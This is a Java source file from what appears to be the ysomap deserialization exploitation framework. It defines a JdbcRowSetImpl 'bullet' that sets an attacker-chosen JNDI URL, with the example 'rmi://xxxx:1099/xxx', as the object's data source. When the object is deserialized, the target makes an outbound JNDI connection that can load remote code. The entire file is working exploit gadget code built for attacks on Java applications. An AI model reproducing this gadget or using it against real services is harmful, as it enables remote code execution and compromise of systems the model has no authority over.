package ysomap.bullets.jdk;

import com.sun.rowset.JdbcRowSetImpl;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2020/3/2
 */
@Bullets
@Dependencies({"jdk"})
@Details("向外部发起JNDI连接")
@Targets({Targets.JDK})
@Authors({Authors.WH1T3P1G})
public class JdbcRowSetImplBullet extends AbstractBullet<JdbcRowSetImpl> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    public String action = "getDatabaseMetaData"; // for xstream eventhandler gadgets

    @Override
    public JdbcRowSetImpl getObject() throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiURL);
        return jdbcRowSet;
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new JdbcRowSetImplBullet();
        bullet.set("jndiURL", args[0]);
        return bullet;
    }
}
